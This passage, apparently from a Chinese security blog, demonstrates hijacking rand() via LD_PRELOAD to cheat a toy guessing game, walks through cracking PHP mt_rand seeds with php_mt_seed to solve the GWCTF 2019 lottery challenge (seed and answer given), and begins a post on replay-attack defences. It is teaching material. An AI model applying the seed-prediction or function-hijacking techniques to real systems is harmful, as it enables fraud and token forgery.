class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Seed the random number generator with the current time.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>) time(&amp;t));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Now get a random number between 1 and 31337.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    rand_num = rand() % <span class="number">31338</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Print the variables if this is a debug build.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" [DEBUG] user_guess =&gt; %d\n"</span>, user_guess);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" [DEBUG]   rand_num =&gt; %d\n"</span>, rand_num);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// See if the users number is equal to the number generated. If</span></span><br><span class="line">    <span class="comment">// so, let the user know they won.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="keyword">if</span> (user_guess == rand_num)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" [%s+%s] %sYou Win! :-)%s\n\n"</span>, GREEN, NC, GREEN, NC);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">//      The user guessed wrong, let them know the lost.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" [%s-%s] %sYou lose. :-(%s\n\n"</span>, RED, NC, RED, NC);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>rand_hijack.c</code>重写<code>rand()</code>库函数，只返回数字<code>42</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***********************************************************************</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Project: rand_hijack.so</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Author: Travis Phillips</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Date: 10/24/2020</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Project Repo:</span></span><br><span class="line"><span class="comment"> *  https://github.com/ProfessionallyEvil/LD_PRELOAD-rand-Hijack-Example</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Purpose: This is simple code for a LD_PRELOAD shared object that</span></span><br><span class="line"><span class="comment"> *          will make the call to rand() always return a static value</span></span><br><span class="line"><span class="comment"> *          of 42. We will use this to cheat in the number guessing</span></span><br><span class="line"><span class="comment"> *          game by making it not-so-random anymore.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Compile: gcc -FPIC -shared rand_hijack.c -o rand_hijack.so</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">***********************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Our version of rand() to hijack random number generation with.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>; <span class="comment">// The answer is always 42. It's always 42...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Makefile</code> 说明了几种编译方法</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CFLAGS = -Wall -O3</span><br><span class="line"></span><br><span class="line"><span class="section">all: game hijack</span></span><br><span class="line"></span><br><span class="line"><span class="section">game:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -s src/guessing_game.c -o guessing_game</span><br><span class="line"></span><br><span class="line"><span class="section">game_debug:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -DDEBUG src/guessing_game.c -o guessing_game</span><br><span class="line"></span><br><span class="line"><span class="section">game_nocolor:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -s -DNOCOLOR src/guessing_game.c -o guessing_game</span><br><span class="line"></span><br><span class="line"><span class="section">game_debug_nocolor:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -DNOCOLOR -DDEBUG src/guessing_game.c -o guessing_game</span><br><span class="line"></span><br><span class="line"><span class="section">hijack:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -FPIC -shared src/rand_hijack.c -o rand_hijack.so</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f guessing_game rand_hijack.so</span><br><span class="line"></span><br><span class="line"><span class="section">help:</span></span><br><span class="line">	@echo <span class="string">"Default Target:"</span></span><br><span class="line">	@echo <span class="string">"\t all =&gt; Build the default guessing game &amp; hijack shared object."</span></span><br><span class="line">	@echo <span class="string">"\nGame Targets:"</span></span><br><span class="line">	@echo <span class="string">"\t game =&gt; Build the default guessing game."</span></span><br><span class="line">	@echo <span class="string">"\t game_debug =&gt; Builds a debug version of guessing game."</span></span><br><span class="line">	@echo <span class="string">"\t game_nocolor =&gt; Build a non-colorized guessing game."</span></span><br><span class="line">	@echo <span class="string">"\t game_debug_nocolor =&gt; Build a non-colorized debug guessing game."</span></span><br><span class="line">	@echo <span class="string">"\nHijack Targets:"</span></span><br><span class="line">	@echo <span class="string">"\t hijack =&gt; Build standard LD_PRELOAD hijack shared object."</span></span><br><span class="line">	@echo <span class="string">"\nMaintance Targets:"</span></span><br><span class="line">	@echo <span class="string">"\t clean =&gt; delete the binaries."</span></span><br></pre></td></tr></table></figure>

<h4 id="构造运行"><a href="#构造运行" class="headerlink" title="构造运行"></a>构造运行</h4><ul>
<li>正常状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# make</span><br><span class="line">gcc -Wall -O3 -s src/guessing_game.c -o guessing_game</span><br><span class="line">gcc -Wall -O3 -FPIC -shared src/rand_hijack.c -o rand_hijack.so</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 132</span><br><span class="line"> [-] You lose. :-(</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 4564</span><br><span class="line"> [-] You lose. :-(</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 12345</span><br><span class="line"> [-] You lose. :-(</span><br></pre></td></tr></table></figure>

<p>几乎不会成功</p>
<ul>
<li><code>debug</code>状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# make game_debug</span><br><span class="line">gcc -Wall -O3 -DDEBUG src/guessing_game.c -o guessing_game</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 1232</span><br><span class="line"> [DEBUG] user_guess =&gt; 1232</span><br><span class="line"> [DEBUG]   rand_num =&gt; 2331</span><br><span class="line"> [-] You lose. :-(</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 456</span><br><span class="line"> [DEBUG] user_guess =&gt; 456</span><br><span class="line"> [DEBUG]   rand_num =&gt; 14503</span><br><span class="line"> [-] You lose. :-(</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 12345</span><br><span class="line"> [DEBUG] user_guess =&gt; 12345</span><br><span class="line"> [DEBUG]   rand_num =&gt; 29498</span><br><span class="line"> [-] You lose. :-(</span><br></pre></td></tr></table></figure>

<p>相对于正常状态，输出了真实的随机数，依旧是几乎不会成功</p>
<ul>
<li><code>LD_PRELOAD</code>劫持状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# LD_PRELOAD=./rand_hijack.so ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 42</span><br><span class="line"> [DEBUG] user_guess =&gt; 42</span><br><span class="line"> [DEBUG]   rand_num =&gt; 42</span><br><span class="line"> [+] You Win! :-)</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# LD_PRELOAD=./rand_hijack.so ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 42</span><br><span class="line"> [DEBUG] user_guess =&gt; 42</span><br><span class="line"> [DEBUG]   rand_num =&gt; 42</span><br><span class="line"> [+] You Win! :-)</span><br><span class="line"></span><br><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# LD_PRELOAD=./rand_hijack.so ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 42</span><br><span class="line"> [DEBUG] user_guess =&gt; 42</span><br><span class="line"> [DEBUG]   rand_num =&gt; 42</span><br><span class="line"> [+] You Win! :-)</span><br></pre></td></tr></table></figure>

<p>可见所有的随机数通通被劫持为数字<code>42</code></p>
<ul>
<li>使游戏恢复正常</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/LD_PRELOAD-rand-Hijack-Example-main# ./guessing_game</span><br><span class="line"></span><br><span class="line">        ---===[ Number Guessing Game v1.0 ]===---</span><br><span class="line"></span><br><span class="line"> [?] Guess a number between 0-31337 &gt; 123</span><br><span class="line"> [DEBUG] user_guess =&gt; 123</span><br><span class="line"> [DEBUG]   rand_num =&gt; 5021</span><br><span class="line"> [-] You lose. :-(</span><br></pre></td></tr></table></figure>

<h3 id="PHP伪随机数安全"><a href="#PHP伪随机数安全" class="headerlink" title="PHP伪随机数安全"></a><code>PHP</code>伪随机数安全</h3><p>​    这部分主要从两个点分析</p>
<ul>
<li><p><code>php_mt_seed</code>破解随机数种子(<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a>)</p>
</li>
<li><p>[GWCTF 2019]枯燥的抽奖</p>
</li>
</ul>
<h4 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h4><p>​    举一个例子，如下代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"rand number security demo!"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	</span><br><span class="line">	mt_srand(<span class="number">1523546</span>);</span><br><span class="line">	<span class="comment"># 1523546 种子是需要程序破解的</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">if</span> (mt_rand() === $_REQUEST[<span class="string">"flag"</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"successful!!!"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"failed!!!"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>假设我们不知道种子的情况下</li>
</ul>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/1.png" alt></p>
<ul>
<li>破解种子</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/php_mt_seed<span class="number">-4.0</span><span class="comment"># ./php_mt_seed 1656301859</span></span><br><span class="line">Pattern: EXACT</span><br><span class="line">Version: <span class="number">3.0</span><span class="number">.7</span> to <span class="number">5.2</span><span class="number">.0</span></span><br><span class="line">Found <span class="number">0</span>, trying <span class="number">0x68000000</span> - <span class="number">0x6bffffff</span>, speed <span class="number">341.5</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x6b787bf6</span> = <span class="number">1803058166</span> (PHP <span class="number">3.0</span><span class="number">.7</span> to <span class="number">5.2</span><span class="number">.0</span>)</span><br><span class="line">seed = <span class="number">0x6b787bf7</span> = <span class="number">1803058167</span> (PHP <span class="number">3.0</span><span class="number">.7</span> to <span class="number">5.2</span><span class="number">.0</span>)</span><br><span class="line">Found <span class="number">2</span>, trying <span class="number">0xa8000000</span> - <span class="number">0xabffffff</span>, speed <span class="number">329.3</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0xa8643518</span> = <span class="number">2825139480</span> (PHP <span class="number">3.0</span><span class="number">.7</span> to <span class="number">5.2</span><span class="number">.0</span>)</span><br><span class="line">seed = <span class="number">0xa8643519</span> = <span class="number">2825139481</span> (PHP <span class="number">3.0</span><span class="number">.7</span> to <span class="number">5.2</span><span class="number">.0</span>)</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0xfc000000</span> - <span class="number">0xffffffff</span>, speed <span class="number">338.8</span> Mseeds/s</span><br><span class="line">Version: <span class="number">5.2</span><span class="number">.1</span>+</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0x00000000</span> - <span class="number">0x01ffffff</span>, speed <span class="number">0.0</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x00173f5a</span> = <span class="number">1523546</span> (PHP <span class="number">5.2</span><span class="number">.1</span> to <span class="number">7.0</span>.x; HHVM)</span><br><span class="line">Found <span class="number">5</span>, trying <span class="number">0x3a000000</span> - <span class="number">0x3bffffff</span>, speed <span class="number">6.1</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x3b6263b0</span> = <span class="number">996303792</span> (PHP <span class="number">7.1</span><span class="number">.0</span>+)</span><br><span class="line">Found <span class="number">6</span>, trying <span class="number">0x7c000000</span> - <span class="number">0x7dffffff</span>, speed <span class="number">6.1</span> Mseeds/s</span><br></pre></td></tr></table></figure>

<ul>
<li>发现种子 <code>1523546</code></li>
</ul>
<h4 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h4><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>继续读取<code>README</code>写出如下例子</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pw2args.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $allowable_characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">    $len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line">    $pass = $argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($pass); $i++) &#123;</span><br><span class="line">        $number = strpos($allowable_characters, $pass[$i]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$number $number 0 $len  "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/2.png" alt></p>
<ul>
<li>为了验证方便，我们打印出种子</li>
</ul>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/3.png" alt></p>
<ul>
<li>生成序列</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/php_mt_seed-4.0# php pw2args.php lYneoCRuJd</span><br><span class="line"><span class="meta">#</span><span class="bash"> pw2args.php</span></span><br><span class="line">11 11 0 61  60 60 0 61  13 13 0 61  4 4 0 61  14 14 0 61  38 38 0 61  53 53 0 61  20 20 0 61  45 45 0 61  3 3 0 61</span><br></pre></td></tr></table></figure>

<ul>
<li>破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./php_mt_seed `php pw2args.php lYneoCRuJd`</span><br><span class="line">./php_mt_seed 11 11 0 61  60 60 0 61  13 13 0 61  4 4 0 61  14 14 0 61  38 38 0 61  53 53 0 61  20 20 0 61  45 45 0 61  3 3 0 61</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@KALI:~/laotie/php_mt_seed-4.0# ./php_mt_seed 11 11 0 61  60 60 0 61  13 13 0 61  4 4 0 61  14 14 0 61  38 38 0 61  53 53 0 61  20 20 0 61  45 45 0 61  3 3 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 177.9 Mseeds/s</span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x1e000000 - 0x1fffffff, speed 5.2 Mseeds/s</span><br><span class="line">seed = 0x1edbf198 = 517730712 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 1, trying 0x26000000 - 0x27ffffff, speed 5.2 Mseeds/s</span><br></pre></td></tr></table></figure>

<ul>
<li>最终解出密钥为 <code>517730712</code></li>
<li>解密脚本 <code>lYneoCRuJd8qaPg6E4Mf</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$seed=<span class="number">517730712</span>;</span><br><span class="line">	mt_srand($seed);</span><br><span class="line">	$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">	$str=<span class="string">''</span>;</span><br><span class="line">	$len1=<span class="number">20</span>;</span><br><span class="line">	<span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">		$str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/4.png" alt></p>
<p>解题</p>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/5.png" alt></p>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/6.png" alt></p>
<p>最后种子为 <code>502565397</code></p>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/7.png" alt></p>
<p>最后答案为<code>C9oJKgCnYHzwVn9EbRfi</code></p>
<p><img data-src="./%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/8.png" alt></p>
<h2 id="后记：一些安全函数"><a href="#后记：一些安全函数" class="headerlink" title="后记：一些安全函数"></a>后记：一些安全函数</h2><p>验证使用安全随机函数算法, 比如 </p>
<ul>
<li><code>java: SecureRandom</code></li>
<li><code>c#: RNGCryptoServiceProvider</code></li>
<li><code>c/c++: libsodium,randombytes_buf()</code></li>
<li><code>python: os.urandom(), random.SystemRandom()</code></li>
<li><code>nodejs: node-sodium</code></li>
<li><code>php: 对于php5，获取random_compat: random_bytes,random_int</code></li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>重放攻击防御浅析</title>
    <url>/2021/08/01/blog_formal/security/%E5%AE%89%E5%85%A8%E6%96%B9%E6%A1%88/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="重放攻击防御浅析"><a href="#重放攻击防御浅析" class="headerlink" title="重放攻击防御浅析"></a>重放攻击防御浅析</h1><p>​    重放攻击是指攻击者截取并发送一个目的主机已接收过的包，来达到欺骗系统的目的。本质是防止相同数据包多次释放导致引发的一些安全问题，如钓鱼，条件竞争等</p>
<a id="more"></a>

<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><ul>
<li><p>限制绕过</p>
<ul>
<li>某站举办活动，有个摇奖机，摇一次之后需要在下一个小时才能摇奖，通过重放绕过</li>
</ul>
</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/1.png" alt></p>
<ul>
<li>某地方运营商举办让红包飞活动，中奖后可活动使用码兑换50M流量。抓取兑换流量的数据包进行重放可无限次兑换流量</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/2.png" alt></p>
<ul>
<li><p>条件竞争</p>
<ul>
<li>某<code>App</code>推出了新人领红包活动，新号可以免费领一次红包，使用抓包工具进行抓取领红包的数据包。然后同时并发多个数据包。由于没有做好大量并发请求的处理，可同时领到多个红包</li>
</ul>
</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/3.png" alt></p>
<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h3 id="基于timestamp的方案设计"><a href="#基于timestamp的方案设计" class="headerlink" title="基于timestamp的方案设计"></a>基于<code>timestamp</code>的方案设计</h3><ul>
<li>单次<code>HTTP</code>请求，都加上<code>timestamp</code>参数。一次正常的<code>HTTP</code>请求，从发出到达服务器一般都不会超过<code>60</code>s，所以服务器收到<code>HTTP</code>请求之后，首先判断时间戳参数与当前时间相比较，是否超过了<code>60</code>s，如果超过了则认为是非法的请求</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/4.png" alt></p>
<ul>
<li>参数设计</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/5.png" alt></p>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/6.png" alt></p>
<ul>
<li>判断<code>&amp;&amp;</code>优缺点<ul>
<li>每次处理<code>HTTP</code>请求时，对比数据包中的<code>time</code>与服务端主机时间差</li>
<li>在一定时间内，依然可以重放，较大可能性防止钓鱼攻击，条件竞争依旧可以重放攻击</li>
</ul>
</li>
</ul>
<h3 id="基于nonce的方案设计"><a href="#基于nonce的方案设计" class="headerlink" title="基于nonce的方案设计"></a>基于<code>nonce</code>的方案设计</h3><ul>
<li><code>nonce：number use of once</code>,意思是仅一次有效的随机字符串，要求每次请求时，该参数要保证不同，所以该参数一般与时间戳有关，为了方便起见，直接使用时间戳的16进制，实际使用时可以加上客户端的<code>ip</code>地址，<code>mac</code>地址等信息做个哈希之后，作为<code>nonce</code>参数</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/7.png" alt></p>
<ul>
<li>参数设计</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/8.png" alt></p>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/9.png" alt></p>
<ul>
<li>判断<code>&amp;&amp;</code>优缺点<ul>
<li>每次处理<code>HTTP</code>请求时，首先判断该请求的<code>nonce</code>参数是否在“集合”中，如果存在则认为是非法请求</li>
<li>服务端维护一个集合，随着时间越来越大，消耗资源</li>
</ul>
</li>
</ul>
<h3 id="基于timestamp-nonce的方案设计"><a href="#基于timestamp-nonce的方案设计" class="headerlink" title="基于timestamp+nonce的方案设计"></a>基于<code>timestamp+nonce</code>的方案设计</h3><ul>
